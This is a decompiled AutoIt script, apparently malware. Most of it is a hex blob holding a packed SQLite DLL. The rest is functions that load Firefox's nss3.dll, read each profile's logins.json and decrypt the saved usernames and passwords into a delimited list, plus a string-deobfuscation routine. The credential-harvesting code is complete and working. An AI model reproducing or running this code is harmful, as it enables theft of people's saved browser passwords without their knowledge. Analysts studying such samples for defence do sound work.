80B244209400528252513181224273212D20A0D6F82DFDE4418558B09DA181A1F18271162040D080F07092EF8FF0D200A30F0A6010D9E0B3C0924160C062868DE0D0A9A2E1047860DC709090C100BCCFEFF570E0E6505510D0E0D130D22F0"
    $sHex &= "F00107B839395A00A028F80B4A0108150BF07702FEFFA0DAED76D018158A270F18400C0F06820EDFF03FFBAE0D0A1CDC23152640062A069C267A230A387D0FDFEE084C103406150E0B071B040702080713AC0D991064745602B5D64C790F160B05EE82206C333237FF3798A604393DA22106325708400A28194130BDE07FC51252661E220B0F380A500B0A111EB301110892FE41F37E6C061780374F1332190FB717FFC5F63979061906D6230D0C7C24085E091530E2FF8AFF300CF00C01C705121E42710B7A19290517581C370BDEA1A49B4E00102F0E1E07026FDF15821B728A0F1C08D418060F020E0916B5E06F9A0A0E401D1DF063F2062B30C18FAFC86208AD3D1706113AD43AFFAF58E0700C190AE0373513701D486C1F750C1312FFDF61B71BE617191C906C0F27291123C52A4B4C4F486617FF1738FE113CF082015C15CA0E4701650C781A092238430682826F6F7E23C40D642451010F83125C0A565F60FF055097B0237ED1880A18071AA4309975F00DEE30FCFB021212221201F041011D26E80B4760FFF6F0DF2E1201BAF070013110C3FE34040C5D3C2563571D2C2EFAFFFF390DDF0FF0DC03F07101710CEF0D09A21017183614D439100DF39BA3DD2C540119D8A1F800F065012F0709771DADD30B873A04DE9AA114186CCDBF8A23EC2A0CE60339F0D8089292023BFEB635140A04F02B1AA301F0D10BA33BAC113957FCFF8215C6230B14362BD8A72758C9F0F10090A644F0E50BFEFFA6031A25062E482F323634146722186A1114F20F5AFFA2FFFF103920610F0A22243A32203A4B3B4139389C15082DF0FA00F0048617FF4D526002806D63476C7665422617D8FA83FFFF992B31196416650D340D420D250D4407B12B150380143B6E574A54B9225CCE0C49309C0B27BFC12A4474CA28081A922828201611E00E53FB201709AF090619D22A087CA0F42A4187CEB63814DE8A01064E9C4864589401AF9A34AC0B6871F82B3E144E1B15F02D04E49817750A94A85C2D6C2C23233BFECDF529234229655C0663141D121614172A38BEFDFDF09B021EF0C1505F011E327A5E1C394417E88EFBDB5792021637F02908F06B071C1CF0133E86FF82AFEBF0CB02F1F02C0418F0A80BC6F08104993734DCF1241763122C290E1294878E3101AE14FCAA45800211760FA70A702A7610822FC19B36D25C018C07472714C4E6D7ECD514AC0C09580A08061287E0A60578200898154721E0C4BB462A513FA6483CFE1125F145FB8E0A980A25120816B808261B990BFFFF5DFF429FADC74D4E82F0A203432E46341E299E316142B5542937FF7F880145F0F603B524F06A12EEACCDF03F01E0677FF83CE40B1D0B68F01A01633DF4011A260D828E02BC5819F03801BC148A7620FE1714BC392C"
    $sHex &= "3268F3C07F021B28096E0F742D2D9EE0BF0B960F2015065066138E303CB680155FF5BF9AFE12D810220F11094412081E15ECF00804FFB749B27909775E1FF04D041506228E625A6176159EB42A094D76141ED6B0E33FCE112F112A0E9B0E7E331B464704F88E77FD260EF0FC021F300D1F121D3E5111264C42F1FBFF6FD8576A8B5BE660283E54F03C01770E1A192A032EE2050D1F5CEC7206446F9555D8530476A6F833FCF093038CF0D382BC0B3C3633A8C8C1457FC11E5870E90426F002011B6851F0CD2471BBE07F9A16B5F0D9019109571E145408B96602D97DE303FC5FA648022C148BF02F021019DDFA174322C37FC39D7A03132327E04A13F02502F07802BF20C190CC700703EAB318AE04FE8659478DECEE1BE6800350079980F037BEC5C73A5CC045CB0B07C33DD340F0F262FFFF0B0E3209531680905131272128502F191D17173AA337FDBFE1A4EA45032FF05A0447394236423CB022131BAFFA5D8E305C9E2A432A4579901C6E01602D7FB36F5D943198001A70F01CA236B61C69A54BF0BCAAAFFE8303A80928279ADECFAF66D51C0620AF55FFFF242D4D092B7E24457E4821F01B03BA952E7201406FFEDFDA4B017CB972C201CB591933EC19564AF0BE1D1B2EB907F8FFFFDD20294C1E3C07D4DFF0AF01433BCCF08E15DA7353AA356BDA1AEC159C91741A5E68CC05E2200CFF5EFF607E01582B0F15071F3E80022220200D2160BABDAA1CF615041E12181416C26FDFF4C55B71F0EB8600014FF0EA7EC1048E130B5A85E945F00B04BEA7AEEBEE4101B56D7CF30927CB0901BB1BDF2C1EBFE10F7E6504D0F0D008AAD8F0B60121C61D4332338A11F8C90A4EC07E086C6C1B0B0EBB7601AE940A0A0DF80B19082107BCD516FDFF3B093358F02401BA708318173C042BB0B059C0E6C37684690C4F02CB2ACA010B50607F3D616060F82EF36058063BFE458633F6DC8D0921251BF0D8027CE704E2DF84469BDC34B0014937308A4D3F2A465B9B475920FE2EDD086C71508E556F5B4CFCD4C803241EF6EB2E08F01601FC34200164F0776D81EB3B8E87046C496E12DEF204565057E0F60504BE016DF0554E6A03257CF06101144075FB61F05701474C3D02CA5C68416BBE15355609507B5A8D02A0F06244444D86FF7F74012A5F09A7091F212BC1AD09EF419D8C6EA7055576F8F0EE015887A07808988280BF008E8F0134A1107CBB01387944729B8217E1F02B013E5FE6555C28B58B012F684D0DECD5E0A0120EA6AD844941F641D74E482E1435DF300780158480CD36B4D9968922970DA20A4203FFADC17F9CC82129F0AA03B4CD4A4E0B012F31AD332D18456FC002D3184D349023033ED2A8F030866FDB5F8CD6F0E53E0501E8A205461B248AE5F88BB6861AC901368C011333"
    $sHex &= "1227C89EBBA3F7DFFA6E28294ECC0D1D2460EE77982047B8016F1AFC05E0CF033B5634DE07105C37131740EB98E1FFE934310B40314B457A8330C35895FF01EEF8423E52434D90C5017B4C254E143767F01D2FDAB747B20D15020509131F24B2DBDEFB0413FEEFFFBD1B1855A51CF06B011F156AD4BA09BB16F01F043B1B7ED3A01E9B2903012CF00401002D01825674FB18580D14D910C107D5C4A5360CAE17EDFFE2B804C12C1F32274A7C3E09266CA22970D8EDFFE915426F07A20782A219201F227C3A4E3B2200BBFD6F6858537C2C010C20370C3659F09FAE0F014AD4541CFD7B0330C5E3CE103F0A170A7416740F6193E846121F171860640A1BFEEDA777960FF07903DA73F0660CB40528F07F073774A3E3BF8DF03A770B1508142405060BCC5FF2FFF7BFA44E05743922AF861C0B1303231B0BB21778069D130A0E60F18BBE3EF0600612E8BB9D3A14111304E0ADE0A0000DFCD808C3A8B30421687A7035BC3EBF0199235401D56606BC003F7E1C2B1D3E6409193029152336D388142F4212AB02FBFFFF7F011D0F1DF0E001D710F04C01755824DE5B4D5916A516931A1BBC154670FF0E527F25018D16616BB600406925282018186E6D9FDCFF401C0D080E3D1E4D831701AABA880CD3AE5FBC7BB306B348E93D17B91401EC583C15FDDF8AF15CF04D02181BC61801B14B4D20483A588B164707FF778055073E8F903D8565482B6B083964EF2328F8A2016671030C5A2794038BFF6092827656C30E744405DBF06D075071C484A315ED80E8AA867673F423500128963E3E7F665B2BF886D7509D051EF028149B042E3AF800FBB5B7FF34324036375431F033A4EB140A09443B5A4467196AD96F8EFBF012079F42A674D30BF0750638625A596BAD26A742E71EF70A61166C5B73FC7F041D2B2BCA2209152121D7D44462D48E03BAE1C7017CAE820560E202165F54B02F1024030EBA0401F08801BC7FADF8EA41E25D3230046ED495F05A050CB6C48EB35702FC005923014417742101D61CABA098D033339A36FB1A9AE28A8A961A70B60A041FBE183EB1BD2BDE407901530C46CE02427015100903537C019E3A5A8087050C5943AA767F7BA75B211C97077F8E4C671C0908662B4C3A2BA04D140C37090458F82AC4BF54E9012BBB9353235BDA0FDC000D38C02FDE4D015BE909231A136A97DE42BFE12DE8532AB203147B264F6803AE1FFEC711193B1CF054046538AEBBF0D14EB7265AA42C7856A874AC5504F60008023CD8FFB3E29906A20610A017A31B308D86F05FC1AA02C64B031D0DDB180F2C6024ABFAA6C9E84AA5C8010D0E305E092EBB7C956C2004C2CAF00402089C080D607020320CB0B5BF47EC28081F78602D2C045BD50EF2100C140C2830DD01DF404E10380827749E"
    $sHex &= "0213262E0FF0CC25B6C52A58219808A40487B08D32921C0402E1197EDBFB0C1C0C18041D230EF0E82524B859E88001AC299B9C31CCBE1702681000240CD920038B556903105754BC020CD9077B6003F0E00697F0C40E2FC2D438D87C154F20D60BA37682D003961A038491A77674050C080C0022FE17A0A44C010500E8507B4C9A9BE9EF4FE00002210BC8142A070001BBB900FD27FE37E9402613533E449C1650050F774B084F00700807095C083D6D6F6B3369100F8D90958E8A16F28744B30EBC8C28823008003005ED51F253400800802448898E403185FC606F070090012E8383E714417C280721D7F08B43D6042300602E72BA0B7E906F1A6CF76E7907B3BD970845042E4D4E3C73DB913CCFB0649CC09E73725639418363DD05E70006089F6E6759A7726503DA2921098EE4794E2A06424213262EBF36748E07008366C092244982FE0000804AFF00000000000000000000000000807C2408010F85D901000060BE005005108DBE00C0FAFF57EB109090909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB730B75288B1E83EEFC11DB721F4801DB75078B1E83EEFC11DB11C0EBD401DB75078B1E83EEFC11DB11C9EB5231C983E8037211C1E0088A064683F0FF7475D1F889C5EB0B01DB75078B1E83EEFC11DB72CC4101DB75078B1E83EEFC11DB72BE01DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00FBFFFF83D1028D142F83FDFC760E8A02428807474975F7E942FFFFFF8B0283C204890783C70483E90477F101CFE92CFFFFFF5E89F7B90F2A00008A07472CE83C0177F7803F0E75F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE006008008B0709C0743C8B5F048D84303895080001F35083C708FF9660950800958A074708C074DC89F95748F2AE55FF966495080009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE689508008DBE00F0FFFFBB0010000050546A045357FFD58D870F02000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E91599F7FF00000048000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B0071090890710030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    $sHex &= "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000020010000000200000801800000060000080000000000000000004000000000001000100000038000080000000000000000004000000000001000908000050000000A4A0080034030000E404000000000000000000000000000004000000000001000200000078000080000000000000000004000000000001000904000090000000DCA308005A010000E404000000000000A0300800340334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100070003000000020007000300000002001700000000000000040000000200000000000000000000000000000094020000010053007400720069006E006700460069006C00650049006E0066006F00000070020000010030003800300039003000340062003000000050001800010043006F006D00700061006E0079004E0061006D00650000000000530051004C00690074006500200044006500760065006C006F0070006D0065006E00740020005400650061006D000000720025000100460069006C0065004400650073006300720069007000740069006F006E0000000000530051004C006900740065002000440079006E0061006D006900630020004C0069006E006B0020004C00690062007200610072007900200028004E006F002000540043004C00290000000000300008000100460069006C006500560065007200730069006F006E000000000033002E0037002E0032002E00300000002E000700010049006E007400650072006E0061006C004E0061006D0065000000530051004C00690074006500000000005400180001004C006500670061006C0043006F007000790072006900670068007400000032003000300030002D00320030003100300020005000750062006C0069006300200044006F006D00610069006E00000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530051004C0069007400650033002E0064006C006C0000006A0025000100500072006F0064007500630074004E0061006D00650000000000530051004C006900740065002000440079006E0061006D006900630020004C0069006E006B0020004C00690062007200610072007900200028004E006F002000540043004C00290000000000340008000100500072006F00640075006300740056006500"
    $sHex &= "7200730069006F006E00000033002E0037002E0032002E0030000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000908B004D43308003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E504100000000000000000000000078A5080060A50800000000000000000000000000000000000000000084A5080092A50800A2A50800B2A50800C0A50800000000004B45524E454C33322E444C4C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C4672656500000000000000E7507B4C0000000032AD080001000000B9000000B9000000F8A50800DCA80800C0AB0800F0B3020040CC0000E0200500E08C0400F0430500E0D30000F0D30000B0530400B0D5040090BA040070BA040010BA0400D0B90400B0CB000070A501001081010080D5040050D50400F0FD040070B90400B0CA000080FD040000F3060050FD040020FD0400101F0100306E0100E0A90000C00E020060720400601C0100101C010030BE0400F0BD0400B0BD040010CC0000A083030080830300E0830300C083030070BD040030BD0400F0BC0400208403000084030020830300008303006083030040830300B0BC040010BC0400D0BB040050BC0400A01D0100B01A0100D01A0100E0200100F000050080DB020090CC0000B0990400A098040040990400709B0400E09A0400109C0400E09B0400E0CB000090DE010080CB000030AA000040D80200C05F0600702D010060D9000080190300307E0300C06E040030EF0600C0CC000030190300801B0100309A0100E0D5040040680100D078010060A8000050CC000020FA060070A80000"
    $sHex &= "10FF040000A90000F0A9000070AA000050AA000080A80000B0790400307E0200002D050070980100E016030010170300707E0200E00E0100800E0100A00E0100300E0100500E0100903D0100404E0500504D0500204E0500A0EF000010160300509A0400E0670600606B0600306B0600B0670600F01D0100901E010080960100C0FF0100800C010070BE040080200500608B0400A061040070610400406104000061040040480400D0600400B04702009047020070480400408B0400208B0400008B0400E08A04008048030070470200001D0100203401005046020010320500C01B0100504E0200202D050060AA0000D0D2000020DB0200C0ED060040CB000040050100D0010700F04A050050A8000040AA0000D0A90000401E0100E0680200501D0100A0CC0000D07103006084030040840300D0570300B057030090570300A0870400B0710300907103007071030050710300B0CC00001453070090100100706B0100306B0100C04E0200109A0400906F0400B01C0100806201003EAD080058AD080070AD080087AD08009DAD0800B1AD0800CAAD0800E3AD0800F7AD080009AE08001DAE08002EAE080041AE080053AE080070AE08008DAE0800A9AE0800BBAE0800CFAE0800E2AE0800F8AE08000BAF08001EAF080030AF080042AF080055AF08006AAF08007FAF08008FAF0800A6AF0800B4AF0800CDAF0800E8AF0800FCAF080011B0080028B008003DB008005AB0080079B0080091B00800ABB00800C1B00800D4B00800E9B00800FDB0080013B108002EB108004BB1080065B1080081B1080095B10800ABB10800BFB10800D4B10800E8B1080002B208001DB208002EB2080041B2080050B208006AB2080083B208009EB20800BAB20800D2B20800ECB2080002B308001BB308002EB3080040B3080052B3080063B3080075B308008AB30800A8B30800C4B30800D4B30800E3B30800F4B3080001B4080011B408002AB4080048B408005DB408006EB408007BB408008EB40800A5B40800B9B40800CBB40800E2B40800F5B4080007B5080021B5080034B508004EB508005CB5080073B508007FB508008EB50800A3B50800BCB50800D0B50800E0B50800F4B5080008B608001BB608002FB6080041B6080053B6080060B608006FB608007FB608008EB608009EB60800B8B60800C8B60800DAB60800EFB6080002B7080012B708002BB708003EB708004EB7080065B7080073B7080090B70800A4B70800BAB70800CFB70800E6B7080000B808001BB8080037B808004AB808005FB8080073B8080087B808009DB80800B5B80800CDB80800E2B80800FAB8080010B9080027B908003BB908004CB908005AB908006BB9080083B9080094B90800A0B90800AFB90800BCB90800D0B90800"
    $sHex &= "E1B90800FFB9080014BA08002BBA08003EBA080054BA080062BA08007CBA080090BA0800A2BA0800B5BA0800C9BA0800DFBA0800F4BA080006BB08001ABB080035BB080048BB08005DBB080074BB08008BBB08009EBB0800AEBB0800BFBB0800D4BB0800EBBB0800FCBB080017BC08002EBC08003FBC080000000100020003000400050006000700080009000A000B000C000D000E000F0010001100120013001400150016001700180019001A001B001C001D001E001F0020002100220023002400250026002700280029002A002B002C002D002E002F0030003100320033003400350036003700380039003A003B003C003D003E003F0040004100420043004400450046004700480049004A004B004C004D004E004F0050005100520053005400550056005700580059005A005B005C005D005E005F0060006100620063006400650066006700680069006A006B006C006D006E006F0070007100720073007400750076007700780079007A007B007C007D007E007F0080008100820083008400850086008700880089008A008B008C008D008E008F0090009100920093009400950096009700980099009A009B009C009D009E009F00A000A100A200A300A400A500A600A700A800A900AA00AB00AC00AD00AE00AF00B000B100B200B300B400B500B600B700B80053514C697465332E646C6C0073716C697465335F6167677265676174655F636F6E746578740073716C697465335F6167677265676174655F636F756E740073716C697465335F6175746F5F657874656E73696F6E0073716C697465335F6261636B75705F66696E6973680073716C697465335F6261636B75705F696E69740073716C697465335F6261636B75705F70616765636F756E740073716C697465335F6261636B75705F72656D61696E696E670073716C697465335F6261636B75705F737465700073716C697465335F62696E645F626C6F620073716C697465335F62696E645F646F75626C650073716C697465335F62696E645F696E740073716C697465335F62696E645F696E7436340073716C697465335F62696E645F6E756C6C0073716C697465335F62696E645F706172616D657465725F636F756E740073716C697465335F62696E645F706172616D657465725F696E6465780073716C697465335F62696E645F706172616D657465725F6E616D650073716C697465335F62696E645F746578740073716C697465335F62696E645F7465787431360073716C697465335F62696E645F76616C75650073716C697465335F62696E645F7A65726F626C6F620073716C697465335F626C6F625F62797465730073716C697465335F626C6F625F636C6F73650073716C697465335F626C6F625F6F70656E00"
    $sHex &= "73716C697465335F626C6F625F726561640073716C697465335F626C6F625F77726974650073716C697465335F627573795F68616E646C65720073716C697465335F627573795F74696D656F75740073716C697465335F6368616E6765730073716C697465335F636C6561725F62696E64696E67730073716C697465335F636C6F73650073716C697465335F636F6C6C6174696F6E5F6E65656465640073716C697465335F636F6C6C6174696F6E5F6E656564656431360073716C697465335F636F6C756D6E5F626C6F620073716C697465335F636F6C756D6E5F62797465730073716C697465335F636F6C756D6E5F627974657331360073716C697465335F636F6C756D6E5F636F756E740073716C697465335F636F6C756D6E5F64617461626173655F6E616D650073716C697465335F636F6C756D6E5F64617461626173655F6E616D6531360073716C697465335F636F6C756D6E5F6465636C747970650073716C697465335F636F6C756D6E5F6465636C7479706531360073716C697465335F636F6C756D6E5F646F75626C650073716C697465335F636F6C756D6E5F696E740073716C697465335F636F6C756D6E5F696E7436340073716C697465335F636F6C756D6E5F6E616D650073716C697465335F636F6C756D6E5F6E616D6531360073716C697465335F636F6C756D6E5F6F726967696E5F6E616D650073716C697465335F636F6C756D6E5F6F726967696E5F6E616D6531360073716C697465335F636F6C756D6E5F7461626C655F6E616D650073716C697465335F636F6C756D6E5F7461626C655F6E616D6531360073716C697465335F636F6C756D6E5F746578740073716C697465335F636F6C756D6E5F7465787431360073716C697465335F636F6C756D6E5F747970650073716C697465335F636F6C756D6E5F76616C75650073716C697465335F636F6D6D69745F686F6F6B0073716C697465335F636F6D70696C656F7074696F6E5F6765740073716C697465335F636F6D70696C656F7074696F6E5F757365640073716C697465335F636F6D706C6574650073716C697465335F636F6D706C65746531360073716C697465335F636F6E6669670073716C697465335F636F6E746578745F64625F68616E646C650073716C697465335F6372656174655F636F6C6C6174696F6E0073716C697465335F6372656174655F636F6C6C6174696F6E31360073716C697465335F6372656174655F636F6C6C6174696F6E5F76320073716C697465335F6372656174655F66756E6374696F6E0073716C697465335F6372656174655F66756E6374696F6E31360073716C697465335F6372656174655F6D6F64756C650073716C697465335F6372656174655F6D6F64756C655F"
    $sHex &= "76320073716C697465335F646174615F636F756E740073716C697465335F64625F636F6E6669670073716C697465335F64625F68616E646C650073716C697465335F64625F6D757465780073716C697465335F64625F7374617475730073716C697465335F6465636C6172655F767461620073716C697465335F656E61626C655F6C6F61645F657874656E73696F6E0073716C697465335F656E61626C655F7368617265645F63616368650073716C697465335F657272636F64650073716C697465335F6572726D73670073716C697465335F6572726D736731360073716C697465335F657865630073716C697465335F657870697265640073716C697465335F657874656E6465645F657272636F64650073716C697465335F657874656E6465645F726573756C745F636F6465730073716C697465335F66696C655F636F6E74726F6C0073716C697465335F66696E616C697A650073716C697465335F667265650073716C697465335F667265655F7461626C650073716C697465335F6765745F6175746F636F6D6D69740073716C697465335F6765745F617578646174610073716C697465335F6765745F7461626C650073716C697465335F676C6F62616C5F7265636F7665720073716C697465335F696E697469616C697A650073716C697465335F696E746572727570740073716C697465335F6C6173745F696E736572745F726F7769640073716C697465335F6C696276657273696F6E0073716C697465335F6C696276657273696F6E5F6E756D6265720073716C697465335F6C696D69740073716C697465335F6C6F61645F657874656E73696F6E0073716C697465335F6C6F670073716C697465335F6D616C6C6F630073716C697465335F6D656D6F72795F616C61726D0073716C697465335F6D656D6F72795F6869676877617465720073716C697465335F6D656D6F72795F757365640073716C697465335F6D7072696E74660073716C697465335F6D757465785F616C6C6F630073716C697465335F6D757465785F656E7465720073716C697465335F6D757465785F667265650073716C697465335F6D757465785F6C656176650073716C697465335F6D757465785F7472790073716C697465335F6E6578745F73746D740073716C697465335F6F70656E0073716C697465335F6F70656E31360073716C697465335F6F70656E5F76320073716C697465335F6F735F656E640073716C697465335F6F735F696E69740073716C697465335F6F7665726C6F61645F66756E6374696F6E0073716C697465335F707265706172650073716C697465335F7072657061726531360073716C697465335F7072657061726531365F76320073716C697465335F707265706172655F76"
    $sHex &= "320073716C697465335F70726F66696C650073716C697465335F70726F67726573735F68616E646C65720073716C697465335F72616E646F6D6E6573730073716C697465335F7265616C6C6F630073716C697465335F72656C656173655F6D656D6F72790073716C697465335F72657365740073716C697465335F72657365745F6175746F5F657874656E73696F6E0073716C697465335F726573756C745F626C6F620073716C697465335F726573756C745F646F75626C650073716C697465335F726573756C745F6572726F720073716C697465335F726573756C745F6572726F7231360073716C697465335F726573756C745F6572726F725F636F64650073716C697465335F726573756C745F6572726F725F6E6F6D656D0073716C697465335F726573756C745F6572726F725F746F6F6269670073716C697465335F726573756C745F696E740073716C697465335F726573756C745F696E7436340073716C697465335F726573756C745F6E756C6C0073716C697465335F726573756C745F746578740073716C697465335F726573756C745F7465787431360073716C697465335F726573756C745F74657874313662650073716C697465335F726573756C745F7465787431366C650073716C697465335F726573756C745F76616C75650073716C697465335F726573756C745F7A65726F626C6F620073716C697465335F726F6C6C6261636B5F686F6F6B0073716C697465335F7365745F617574686F72697A65720073716C697465335F7365745F617578646174610073716C697465335F73687574646F776E0073716C697465335F736C6565700073716C697465335F736E7072696E74660073716C697465335F736F66745F686561705F6C696D69740073716C697465335F736F7572636569640073716C697465335F73716C0073716C697465335F7374617475730073716C697465335F737465700073716C697465335F73746D745F7374617475730073716C697465335F7374726E69636D700073716C697465335F7461626C655F636F6C756D6E5F6D657461646174610073716C697465335F746573745F636F6E74726F6C0073716C697465335F7468726561645F636C65616E75700073716C697465335F746872656164736166650073716C697465335F746F74616C5F6368616E6765730073716C697465335F74726163650073716C697465335F7472616E736665725F62696E64696E67730073716C697465335F7570646174655F686F6F6B0073716C697465335F757365725F646174610073716C697465335F76616C75655F626C6F620073716C697465335F76616C75655F62797465730073716C697465335F76616C75655F627974657331360073716C697465335F76"
    $sHex &= "616C75655F646F75626C650073716C697465335F76616C75655F696E740073716C697465335F76616C75655F696E7436340073716C697465335F76616C75655F6E756D657269635F747970650073716C697465335F76616C75655F746578740073716C697465335F76616C75655F7465787431360073716C697465335F76616C75655F74657874313662650073716C697465335F76616C75655F7465787431366C650073716C697465335F76616C75655F747970650073716C697465335F76657273696F6E0073716C697465335F7666735F66696E640073716C697465335F7666735F72656769737465720073716C697465335F7666735F756E72656769737465720073716C697465335F766D7072696E74660073716C697465335F77616C5F6175746F636865636B706F696E740073716C697465335F77616C5F636865636B706F696E740073716C697465335F77616C5F686F6F6B0073716C697465335F77696E33325F6D6263735F746F5F7574663800000000900800100000000D3D283F2C3F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    Return BinaryToString($sHex)
EndFunc

Func __GetJsonStr(ByRef $ReadJson, $sFind)
    Local $pos = StringInStr($ReadJson, $sFind)
    If $pos > 0 Then
        $ReadJson = StringMid($ReadJson, $pos + StringLen($sFind))
        Return StringLeft($ReadJson, StringInStr($ReadJson, '"') - 1)
    EndIf
EndFunc

Func  __FireFoxDecrypt($h_NSS3, $sCryptedData)
    Local $tData
    Local $hSlot = DllCall($h_NSS3, "HANDLE:cdecl", "PK11_GetInternalKeySlot")
    If IsArray($hSlot) And $hSlot[0] Then
        Local $icall = DllCall($h_NSS3, "INT_PTR:cdecl", "PK11_CheckUserPassword", "handle", $hSlot[0], "wstr", "")
        If IsArray($icall) And $icall[0] = 0 Then
            Local $iLen = StringLen($sCryptedData) * 2
            Local $DataIn = DllStructCreate("int;ptr;int"), $DataOut = DllStructCreate("int;ptr;int"), $tByteData = DllStructCreate("byte[" & $iLen & "]")
            $icall = DllCall("Crypt32", "INT_PTR", "CryptStringToBinaryA", "str", $sCryptedData, "INT_PTR", 0, "INT_PTR", 1, "ptr", DllStructGetPtr($tByteData), "INT_PTR*", $iLen, "INT_PTR", 0, "INT_PTR", 0)
            DllStructSetData($DataIn, 1, 0)
            DllStructSetData($DataIn, 2, DllStructGetPtr($tByteData))
            DllStructSetData($DataIn, 3, $icall[5])
            DllCall($h_NSS3, "INT_PTR:cdecl", "PK11SDR_Decrypt", "ptr", DllStructGetPtr($DataIn), "ptr", DllStructGetPtr($DataOut), "INT_PTR", 0)
            $tData = DllStructGetData(DllStructCreate("char[" & DllStructGetData($DataOut, 3) & "]", DllStructGetData($DataOut, 2)), 1)
            DllCall($h_NSS3, "INT_PTR:cdecl", "SECITEM_ZfreeItem", "ptr", DllStructGetPtr($DataOut), "INT_PTR", 0)
        EndIf
        DllCall($h_NSS3, "INT_PTR:cdecl", "PK11_FreeSlot", "handle", $hSlot[0])
    EndIf
    Return $tData
EndFunc

Func _Firefox_Password_recovery()
    Local $sReturn
    ; _GetFireFoxinstallPath
    Local $sRegFireFox = "HKLM64\SOFTWARE\Mozilla\Mozilla Firefox\"
    Local $F_Path = RegRead($sRegFireFox & RegRead($sRegFireFox, "CurrentVersion") & "\Main", "Install Directory")
    If $F_Path <> "" Then
        ;  _FireFoxProFilePath
        Local $saveCurrentDir = @WorkingDir
        FileChangeDir($F_Path)
        Local $sPath, $i, $Rduni, $icall
        For $i = 0 To 10
            $sPath = @AppDataDir & "\Mozilla\Firefox\"
            $Rduni = IniRead($sPath & "profiles.ini", "Profile" & $i, "Path", "")
            $sPath = $sPath & $Rduni
            If $Rduni <> "" Then
                Local $h_NSS3 = DllOpen($F_Path & "\nss3.dll")
                If $h_NSS3 <> -1 Then
                    $icall = DllCall($h_NSS3, "INT_PTR:cdecl", "NSS_Init", "str", $sPath)
                    If IsArray($icall) And $icall[0] = 0 Then
                        Local $ReadJson = FileRead($sPath & "\logins.json")
                        Local $sHostName, $sUsername, $sPassword
                        While $ReadJson <> ""
                            $sHostName = __GetJsonStr($ReadJson, '"' & $"hostname" & '":"')
                            If $sHostName = "" Then ExitLoop
                            $sUsername = __GetJsonStr($ReadJson, '"' & $"encryptedUsername" & '":"')
                            $sPassword = __GetJsonStr($ReadJson, '"' & "encryptedPassword" & '":"')
                            $sReturn &= $sHostName & "|#" &  __FireFoxDecrypt($h_NSS3, $sUsername) & "|#" &  __FireFoxDecrypt($h_NSS3, $sPassword) & "|@"
                        WEnd
                    EndIf
                    DllClose($h_NSS3)
                EndIf
            EndIf
        Next
        FileChangeDir($saveCurrentDir)
    EndIf
    Return $sReturn
EndFunc

Func DecodeFunc($strInput, $dwKey)
    Local $strRet = ""
    Local $strTemp = ""
    For $I = 1 To StringLen($strInput)
        $aChar = StringMid($strInput, $I, 1)
        If StringIsInt($aChar) Then
            $strTemp &= $aChar
        Else
            $strRet &= Chr($strTemp - $dwKey)
            $strTemp = ""
        EndIf
    Next
    Return $strRet
EndFunc

; DeTokenise by myAut2Exe >The Open Source AutoIT/AutoHotKey script decompiler< 2.15 build(212)
